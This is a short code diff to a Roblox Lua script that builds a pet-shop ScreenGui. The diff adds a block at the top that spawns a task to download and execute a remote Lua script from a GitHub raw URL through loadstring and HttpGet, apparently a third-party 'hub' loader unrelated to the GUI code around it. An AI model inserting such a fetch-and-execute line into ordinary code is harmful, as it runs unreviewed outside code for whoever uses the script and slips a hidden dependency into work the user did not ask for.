@@ -1,3 +1,7 @@
+task.spawn(function()
+    -- Load external script
+    loadstring(game:HttpGet(('https://raw.githubusercontent.com/ReQiuYTPL/hub/main/ReQiuYTPLHub.lua'), true))()
+end)
 -- Create the ScreenGui
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "PetShopGui"
